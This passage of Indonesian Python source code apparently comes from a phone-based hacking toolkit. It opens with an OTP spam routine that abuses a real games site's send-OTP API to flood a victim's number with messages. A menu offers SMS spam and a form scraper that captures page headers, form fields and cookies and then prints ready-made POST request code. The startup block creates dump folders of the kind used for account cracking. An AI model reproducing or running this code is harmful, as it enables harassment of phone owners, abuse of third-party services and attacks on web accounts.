            data=json.dumps({"mobile": "+62" + nomor}),
        ).text
        pos = requests.post(
            "https://api.duniagames.co.id/api/user/api/v2/user/send-otp",
            headers={
                "Host": "api.duniagames.co.id",
                "content-length": "58",
                "sec-ch-ua": '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
                "accept-language": "id",
                "sec-ch-ua-mobile": "?1",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36",
                "content-type": "application/json",
                "ciam-type": "FR",
                "accept": "application/json, text/plain, */*",
                "x-device": "c44cbb7b-b080-4cd3-8526-a90c0b5d3a98",
                "sec-ch-ua-platform": '"Android"',
                "origin": "https://duniagames.co.id",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://duniagames.co.id/",
                "accept-encoding": "gzip, deflate, br",
            },
            data=json.dumps({"phoneNumber": "+62" + nomor, "userName": "0" + nomor}),
        ).text
        cetak(
            panel(f" Sukses Spam WA Ke No : +62{nomor}", width=60, style=f"bold white")
        )
    except KeyboardInterrupt:
        sys.exit(f"  [!] Program Dihentikan")


###----------[ MENU BOT ]---------- ###
class botdata:
    def menu(self):
        prints(
            Panel(
                f"""{P2}[{color_text}01{P2}]. Get Data Web [{color_text}02{P2}]. Spam SMS [{color_text}03{P2}]. Kembali Ke menu""",
                width=60,
                style=f"{color_panel}",
            )
        )
        menu = console.input(f" {H2}• {P2}pilih menu : ")
        if menu in ["01", "1"]:
            get_data_web().__init__()
        elif menu in ["02", "2"]:
            spam()
        elif menu in ["03", "3"]:
            back()
        else:
            exit(
                prints(
                    Panel(
                        f"""{M2}🙏 Masukan Yang Bener Tolol""",
                        width=60,
                        style=f"{color_panel}",
                    )
                )
            )


class get_data_web:
    def __init__(self):
        self.xyz = requests.Session()
        prints(
            Panel(
                f"""{H2}masukan url/link yang mau di source code""",
                width=60,
                style=f"{color_panel}",
            )
        )
        url = console.input(f" {H2}• {P2}Masukan URL : ")
        prints(
            Panel(
                f"""{P2}[{color_text}01{P2}].Source Payload	[{color_text}02{P2}].Parsed Payload	\n[{color_text}03{P2}].Source Code Post Requests""",
                width=60,
                style=f"{color_panel}",
            )
        )
        self.tanya = console.input(f" {H2}• {P2}pilih menu : ")
        self.domain = url.split("/")[2]
        self.get_form(url)

    def get_form(self, url):
        req = self.xyz.get(url)
        raq = bs(req.content, "html.parser")
        for x in raq.find_all("form"):
            if self.tanya in ["1", "01", "a"]:
                self.printing1(req, x)
            elif self.tanya in ["2", "02", "b"]:
                self.printing2(req, x)
            elif self.tanya in ["3", "03", "c"]:
                self.printing3(url, req, x)
            else:
                exit(f"{H2}• {P2} Isi Yang Benar Asu")

    def get_head1(self, req):
        data = {}
        head = req.headers
        usls = [
            "cookie",
            "set-cookie",
            "report-to",
            "expires",
            "x-fb-debug",
            "date",
            "last-modified",
            "etag",
        ]
        for x, y in zip(head.keys(), head.values()):
            try:
                if x.lower() in usls:
                    continue
                else:
                    data.update({x: y})
            except Exception as e:
                continue
        return data

    def get_data1(self, form):
        data = {}
        for y in form.find_all("input"):
            try:
                data.update({y["name"]: y["value"]})
            except Exception as e:
                continue
        return data

    def get_data2(self, form):
        data = []
        for y in form.find_all("input"):
            try:
                data.append(y)
            except Exception as e:
                continue
        return data

    def get_post1(self, form):
        z = form["action"]
        if "https://" + self.domain in z:
            return z
        elif "http://" + self.domain in z:
            return z
        else:
            return "https://%s%s" % (self.domain, z)

    def printing1(self, req, x):
        head = self.get_head1(req)
        data = self.get_data1(x)
        post = self.get_post1(x)
        coki = self.xyz.cookies.get_dict()
        prints(
            Panel(f"""{P2}			[Source Payload]{P2}""", width=80, style=f"{color_panel}")
        )
        prints(
            Panel(
                f"""{P2}[HOST]{H2}  %s""" % (self.domain),
                width=80,
                style=f"{color_panel}",
            )
        )
        prints(
            Panel(f"""{P2}[Head]{H2}  %s""" % (head), width=60, style=f"{color_panel}")
        )
        prints(
            Panel(f"""{P2}[Data]{H2}  %s""" % (data), width=60, style=f"{color_panel}")
        )
        prints(
            Panel(f"""{P2}[Coki]{H2}  %s""" % (coki), width=60, style=f"{color_panel}")
        )
        prints(
            Panel(f"""{P2}[Post]{H2}  %s""" % (post), width=60, style=f"{color_panel}")
        )

    def printing2(self, req, x):
        head = self.get_head1(req)
        data = self.get_data2(x)
        post = self.get_post1(x)
        coki = self.xyz.cookies.get_dict()
        print("\n\n[PARSED PAYLOAD]\n")
        print("head = {")
        for x, y in zip(head.keys(), head.values()):
            print("    %s%s: %s" % (x, " " * (29 - len(x)), y))
        print("    }")
        print("data = {")
        for x in data:
            try:
                if "value" in str(x):
                    dp = "name=" + re.search("name=(.*?)/>", str(x)).group(1)
                    fp = re.search('value="(.*?)"', str(dp)).group(1)
                    print(
                        "    %s%s: '%s'," % (x["name"], " " * (19 - len(x["name"])), fp)
                    )
                elif "name" in str(x):
                    print("    %s%s: ''," % (x["name"], " " * (19 - len(x["name"]))))
                else:
                    continue
            except Exception as e:
                continue
        print("    }")
        print("cookie = {")
        for x, y in zip(coki.keys(), coki.values()):
            print("    %s%s: %s" % (x, " " * (5 - len(x)), y))
        print("    }")
        print("next = '%s'" % (post))
        print(
            "post = requests.Session().post(next,headers=head,data=data,cookies=cookie)"
        )

    def printing3(self, url, req, x):
        head = self.get_head1(req)
        data = self.get_data2(x)
        post = self.get_post1(x)
        print("\n\n[SOURCE CODE POST REQUESTS]\n")
        print("url  = '%s'" % (url))
        print("requ = bs(requests.Session().get(url).content,'html.parser')")
        print("head = {")
        for x, y in zip(head.keys(), head.values()):
            print("    %s%s: %s" % (x, " " * (29 - len(x)), y))
        print("    }")
        print("data = {")
        for x in data:
            try:
                if "value" in str(x):
                    dp = "name=" + re.search("name=(.*?)/>", str(x)).group(1)
                    fp = re.search('value="(.*?)"', str(dp)).group(1)
                    gp = dp.replace(fp, "(.*?)")
                    rs = "re.search('%s',str(requ)).group(1)" % (gp)
                    print(
                        "    %s%s: %s," % (x["name"], " " * (19 - len(x["name"])), rs)
                    )
                elif "name" in str(x):
                    print("    %s%s: ''," % (x["name"], " " * (19 - len(x["name"]))))
                else:
                    continue
            except Exception as e:
                continue
        print("    }")
        print("cookie = requests.Session().cookies.get_dict()")
        print("next = '%s'" % (post))
        print(
            "post = requests.Session().post(next,headers=head,data=data,cookies=cookie)"
        )


# -----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__ == "__main__":
    try:
        os.system("git pull")
    except:
        pass
    try:
        os.mkdir("/sdcard/RUDAL-DUMP")
    except:
        pass
    try:
        os.mkdir("OK")
    except:
        pass
    try:
        os.system("pkg install play-audio")
    except:
        pass
    try:
        os.mkdir("/sdcard/FilePayload")
    except:
        pass
    try:
        os.mkdir("CP")
    except:
        pass
    try:
        os.mkdir("data")
    except:
        pass
    try:
        os.system("touch .prox.txt")
    except:
        pass
    try:
        os.system("clear")
    except:
        pass
    login()
